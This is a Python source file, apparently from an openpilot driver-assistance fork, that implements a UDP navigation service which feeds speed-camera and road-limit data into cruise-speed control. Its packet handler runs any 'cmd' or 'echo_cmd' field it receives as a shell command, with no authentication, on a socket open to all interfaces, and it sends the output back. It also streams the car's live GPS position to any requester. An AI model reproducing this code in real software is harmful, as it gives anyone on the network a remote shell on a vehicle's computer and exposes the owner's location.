import fcntl
import json
import os
import select
import signal
import socket
import struct
import subprocess
import sys
import threading
import time
from collections import deque
from threading import Thread

import numpy as np

from cereal import messaging
from openpilot.common.constants import CV
from openpilot.common.realtime import DT_CTRL
from openpilot.common.swaglog import cloudlog

CAMERA_SPEED_FACTOR = 1.0
terminate_flag = threading.Event()


class Port:
  BROADCAST_PORT = 2899
  RECEIVE_PORT = 2843
  LOCATION_PORT = BROADCAST_PORT


class NaviServer:
  def __init__(self):
    self.sm = messaging.SubMaster(['gpsLocationExternal', 'carState'], frequency=int(1. / DT_CTRL))
    self.json_road_limit = None
    self.active = 0
    self.last_updated = 0.0
    self.last_updated_active = 0.0
    self.lock = threading.Lock()
    self.remote_addr = None
    self.remote_gps_addr = None
    self.gps_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    self.location = None

    for target in (self.broadcast_thread, self.update_thread, self.gps_thread):
      thread = Thread(target=target, daemon=True)
      thread.start()

  def gps_thread(self):
    last_run_time = time.monotonic()
    target_interval = 1.25

    while not terminate_flag.is_set():
      current_time = time.monotonic()
      if current_time - last_run_time >= target_interval:
        self.gps_timer()
        last_run_time = current_time
      time.sleep(0.01)

  def gps_timer(self):
    if self.remote_gps_addr is None:
      return

    try:
      if self.sm.valid['gpsLocationExternal'] and self.sm.updated['gpsLocationExternal']:
        self.location = self.sm['gpsLocationExternal']
    except Exception as e:
      cloudlog.info(f"GPS location read error: {e}")
      return

    if self.location is None:
      return

    try:
      json_location = json.dumps({"location": [
        self.location.latitude,
        self.location.longitude,
        self.location.altitude,
        self.location.speed,
        self.location.bearingDeg,
        self.location.horizontalAccuracy,
        self.location.unixTimestampMillis,
        self.location.verticalAccuracy,
        self.location.bearingAccuracyDeg,
        self.location.speedAccuracy,
      ]})

      self.gps_socket.sendto(json_location.encode(), (self.remote_gps_addr[0], Port.LOCATION_PORT))
    except Exception as e:
      cloudlog.info(f"GPS data encode/send error: {e}")
      self.remote_gps_addr = None

  def get_broadcast_address(self):
    try:
      with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        ip = fcntl.ioctl(sock.fileno(), 0x8919, struct.pack('256s', 'wlan0'.encode('utf-8')))[20:24]
        return socket.inet_ntoa(ip)
    except Exception as e:
      cloudlog.info(f"Get broadcast address error: {e}")
      return None

  def broadcast_thread(self):
    broadcast_address = None
    frame = 0

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
      while not terminate_flag.is_set():
        try:
          if broadcast_address is None or frame % 10 == 0:
            broadcast_address = self.get_broadcast_address()

          if broadcast_address is not None and self.remote_addr is None:
            msg = 'EON:ROAD_LIMIT_SERVICE:v1'.encode()
            for i in range(1, 255):
              ip_tuple = socket.inet_aton(broadcast_address)
              new_ip = ip_tuple[:-1] + bytes([i])
              sock.sendto(msg, (socket.inet_ntoa(new_ip), Port.BROADCAST_PORT))
        except Exception as e:
          cloudlog.info(f"Broadcast thread error: {e}")

        time.sleep(5.0)
        frame += 1

  def update_thread(self):
    last_run_time = time.monotonic()
    target_interval = 0.5

    while not terminate_flag.is_set():
      current_time = time.monotonic()
      if current_time - last_run_time >= target_interval:
        try:
          self.sm.update(0)
        except Exception as e:
          cloudlog.error(f"Exception in update_thread: {e}")
        last_run_time = current_time
      time.sleep(0.01)

  def send_sdp(self, sock):
    try:
      if self.remote_addr:
        sock.sendto('EON:ROAD_LIMIT_SERVICE:v1'.encode(), (self.remote_addr[0], Port.BROADCAST_PORT))
    except Exception as e:
      cloudlog.info(f"Send SDP error: {e}")

  def udp_recv(self, sock):
    try:
      ready = select.select([sock], [], [], 0.5)
      if not ready[0]:
        return False

      data, self.remote_addr = sock.recvfrom(2048)
      json_obj = json.loads(data.decode())

      if 'cmd' in json_obj:
        os.system(json_obj['cmd'])
        return False

      if 'request_gps' in json_obj:
        self.remote_gps_addr = self.remote_addr if json_obj['request_gps'] == 1 else None
        return False

      if 'echo' in json_obj:
        echo = json.dumps(json_obj['echo'])
        sock.sendto(echo.encode(), (self.remote_addr[0], Port.BROADCAST_PORT))
        return False

      if 'echo_cmd' in json_obj:
        result = subprocess.run(json_obj['echo_cmd'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        echo = json.dumps({"echo_cmd": json_obj['echo_cmd'], "result": result.stdout})
        sock.sendto(echo.encode(), (self.remote_addr[0], Port.BROADCAST_PORT))
        return False

      with self.lock:
        if 'active' in json_obj:
          self.active = json_obj['active']
          self.last_updated_active = time.monotonic()
        if 'road_limit' in json_obj:
          self.json_road_limit = json_obj['road_limit']
          self.last_updated = time.monotonic()

      return True
    except Exception as e:
      cloudlog.info(f"UDP receive error: {e}")
      with self.lock:
        self.json_road_limit = None
      return False

  def check(self):
    now = time.monotonic()
    if now - self.last_updated > 6.0:
      with self.lock:
        self.json_road_limit = None

    if now - self.last_updated_active > 6.0:
      self.active = 0
      self.remote_addr = None

  def get_json_val(self, json_data, key, default=None):
    try:
      if json_data is not None and key in json_data:
        return json_data[key]
    except Exception as e:
      cloudlog.info(f"JSON value get error for key '{key}': {e}")
    return default

  def get_limit_val(self, key, default=None):
    return self.get_json_val(self.json_road_limit, key, default)


def main():
  server = NaviServer()
  sm = server.sm
  navi_data_sock = messaging.pub_sock('naviData')
  last_run_time = time.monotonic()
  target_interval = 0.33
  v_ego_q = deque(maxlen=3)

  with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
    sock.bind(('0.0.0.0', Port.RECEIVE_PORT))
    sock.setblocking(False)

    while not terminate_flag.is_set():
      try:
        server.udp_recv(sock)

        dat = messaging.new_message('naviData', valid=True)
        dat.init('naviData')
        dat.naviData.active = server.active
        dat.naviData.roadLimitSpeed = server.get_limit_val('road_limit_speed', 0)
        dat.naviData.isHighway = server.get_limit_val('is_highway', False)
        dat.naviData.camType = server.get_limit_val('cam_type', 0)
        dat.naviData.camLimitSpeedLeftDist = server.get_limit_val('cam_limit_speed_left_dist', 0)
        dat.naviData.camLimitSpeed = server.get_limit_val('cam_limit_speed', 0)
        dat.naviData.sectionLimitSpeed = server.get_limit_val('section_limit_speed', 0)
        dat.naviData.sectionLeftDist = server.get_limit_val('section_left_dist', 0)
        dat.naviData.sectionAvgSpeed = server.get_limit_val('section_avg_speed', 0)
        dat.naviData.sectionLeftTime = server.get_limit_val('section_left_time', 0)
        dat.naviData.sectionAdjustSpeed = server.get_limit_val('section_adjust_speed', False)
        dat.naviData.camSpeedFactor = server.get_limit_val('cam_speed_factor', CAMERA_SPEED_FACTOR)
        dat.naviData.currentRoadName = server.get_limit_val('current_road_name', '')
        dat.naviData.isNda2 = server.get_limit_val('is_nda2', False)

        if sm.updated['carState']:
          v_ego_q.append(sm['carState'].vEgo)

        v_ego = float(np.mean(v_ego_q)) if len(v_ego_q) > 0 else 0.0
        traveled = (time.monotonic() - server.last_updated) * v_ego

        if dat.naviData.camLimitSpeedLeftDist > 0:
          dat.naviData.camLimitSpeedLeftDist = int(max(dat.naviData.camLimitSpeedLeftDist - traveled, 0))
        if dat.naviData.sectionLeftDist > 0:
          dat.naviData.sectionLeftDist = int(max(dat.naviData.sectionLeftDist - traveled, 0))

        current_time = time.monotonic()
        if current_time - last_run_time < target_interval:
          time.sleep(0.1)
          continue
        last_run_time = current_time

        navi_data_sock.send(dat.to_bytes())
        server.send_sdp(sock)
        server.check()
      except Exception as e:
        cloudlog.info(f"road_speed_limiter loop error: {e}")
        time.sleep(1.0)


class SpeedLimiter:
  __instance = None

  @classmethod
  def __get_instance(cls):
    return cls.__instance

  @classmethod
  def instance(cls):
    cls.__instance = cls()
    cls.instance = cls.__get_instance
    return cls.__instance

  def __init__(self):
    self.slowing_down = False
    self.started_dist = 0
    self.last_limit_speed_left_dist = 0
    self.sock = messaging.sub_sock('naviData')
    self.naviData = None
    self.logMonoTime = 0

  def recv(self):
    try:
      dat = messaging.recv_sock(self.sock, wait=False)
      if dat is not None:
        self.logMonoTime = dat.logMonoTime
        self.naviData = dat.naviData
    except Exception as e:
      cloudlog.info(f"SpeedLimiter recv error: {e}")
      self.naviData = None

  def get_active(self):
    self.recv()
    return self.naviData.active if self.naviData is not None else 0

  def get_cam_active(self):
    self.recv()
    return self.naviData is not None and self.naviData.active and (self.naviData.camLimitSpeedLeftDist > 0 or self.naviData.sectionLeftDist > 0)

  def get_road_limit_speed(self):
    self.recv()
    if self.naviData is None:
      return 0

    current_time = time.monotonic_ns()
    if (current_time - self.logMonoTime) / 1e9 > 3.0:
      return 0

    return self.naviData.roadLimitSpeed

  def get_max_speed(self, CS, v_cruise_kph, autoNaviSpeedCtrlStart=None, autoNaviSpeedCtrlEnd=None):
    self.recv()
    if self.naviData is None or CS is None:
      self.slowing_down = False
      return 0, 0, 0, False, ''

    is_highway = self.naviData.isHighway
    cam_type = int(self.naviData.camType)
    cam_limit_speed_left_dist = self.naviData.camLimitSpeedLeftDist
    cam_limit_speed = self.naviData.camLimitSpeed
    section_limit_speed = self.naviData.sectionLimitSpeed
    section_left_dist = self.naviData.sectionLeftDist
    section_avg_speed = self.naviData.sectionAvgSpeed
    section_adjust_speed = self.naviData.sectionAdjustSpeed

    if is_highway is not None:
      if is_highway:
        min_limit = 40
        max_limit = 120
      else:
        min_limit = 20
        max_limit = 100
    else:
      min_limit = 10
      max_limit = 120

    if cam_type == 22:
      min_limit = 10

    if cam_limit_speed_left_dist > 0 and cam_limit_speed <= 0:
      self.slowing_down = False
      self.started_dist = 0
      self.last_limit_speed_left_dist = 0
      return 0, 0, cam_limit_speed_left_dist, False, ''

    if cam_limit_speed_left_dist > 0 and cam_limit_speed > 0:
      v_ego = max(float(CS.vEgo), 0.0)
      diff_speed = v_ego * CV.MS_TO_KPH - (cam_limit_speed * CAMERA_SPEED_FACTOR)
      safe_dist = v_ego * (4.0 if cam_type == 22 else 7.0)
      starting_dist = v_ego * (8.0 if cam_type == 22 else 30.0)

      if self.slowing_down and self.last_limit_speed_left_dist - cam_limit_speed_left_dist < -(v_ego * 5):
        self.slowing_down = False

      if min_limit <= cam_limit_speed <= max_limit and (self.slowing_down or cam_limit_speed_left_dist < starting_dist):
        first_started = not self.slowing_down
        if first_started:
          self.started_dist = cam_limit_speed_left_dist
          self.slowing_down = True

        td = self.started_dist - safe_dist
        d = cam_limit_speed_left_dist - safe_dist
        if d > 0.0 and td > 0.0 and diff_speed > 0.0 and (section_left_dist < 10 or cam_type == 2):
          pp = (d / td) ** 0.6
        else:
          pp = 0.0

        self.last_limit_speed_left_dist = cam_limit_speed_left_dist
        return cam_limit_speed * CAMERA_SPEED_FACTOR + int(pp * diff_speed), cam_limit_speed, cam_limit_speed_left_dist, first_started, ''

      self.slowing_down = False
      return 0, cam_limit_speed, cam_limit_speed_left_dist, False, ''

    if section_left_dist > 0 and section_limit_speed <= 0:
      self.slowing_down = False
      self.started_dist = 0
      self.last_limit_speed_left_dist = 0
      return 0, 0, section_left_dist, False, ''

    if section_left_dist > 0 and section_limit_speed > 0:
      if min_limit <= section_limit_speed <= max_limit:
        first_started = not self.slowing_down
        self.slowing_down = True
        speed_diff = 0.0
        if section_adjust_speed:
          speed_diff = (section_limit_speed - section_avg_speed) / 2.0
          speed_diff *= float(np.interp(section_left_dist, [500, 1000], [0.0, 1.0]))
        return section_limit_speed * CAMERA_SPEED_FACTOR + speed_diff, section_limit_speed, section_left_dist, first_started, ''

      self.slowing_down = False
      return 0, section_limit_speed, section_left_dist, False, ''

    self.slowing_down = False
    return 0, 0, 0, False, ''


def signal_handler(sig, frame):
  print('Ctrl+C pressed, exiting.')
  terminate_flag.set()
  sys.exit(0)


if __name__ == '__main__':
  signal.signal(signal.SIGINT, signal_handler)
  main()
